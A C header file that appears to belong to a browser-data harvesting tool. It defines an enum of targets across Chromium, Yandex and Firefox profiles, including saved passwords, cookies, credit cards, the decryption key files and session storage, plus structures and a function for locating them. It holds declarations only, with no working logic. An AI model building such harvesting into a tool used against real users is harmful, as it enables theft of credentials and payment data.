#pragma once

typedef enum _ProfileItem {
	ChromiumKey,
	ChromiumPassword,
	ChromiumCookie,
	ChromiumBookmark,
	ChromiumHistory,
	ChromiumDownload,
	ChromiumCreditCard,
	ChromiumLocalStorage,
	ChromiumSessionStorage,
	ChromiumExtension,

	YandexPassword,
	YandexCreditCard,

	FirefoxKey4,
	FirefoxPassword,
	FirefoxCookie,
	FirefoxBookmark,
	FirefoxHistory,
	FirefoxDownload,
	FirefoxCreditCard,
	FirefoxLocalStorage,
	FirefoxSessionStorage,
	FirefoxExtension,

	ProfileItemEnd
} ProfileItem;

typedef struct _PROFILE_INFO {
	LPWSTR lpProfileName;
	LPWSTR ItemPaths[ProfileItemEnd];
} PROFILE_INFO, *PPROFILE_INFO;

typedef struct _USER_DATA {
	LPWSTR lpUserDataPath;
	LPWSTR lpBrowserName;
	LPWSTR lpKeyPath;
	PPROFILE_INFO* ProfileList;
	DWORD cProfile;
} USER_DATA, *PUSER_DATA;

PUSER_DATA* PickChromium
(
	_Out_ PDWORD pdwNumberOfUserDatas
);

VOID FreeUserData
(
	_In_ PUSER_DATA pUserData
);

//typedef struct _PROFILE_LIST {
//	PPROFILE_INFO List;
//	DWORD cProfileInfo;
//} PROFILE_LIST, *PPROFILE_LIST;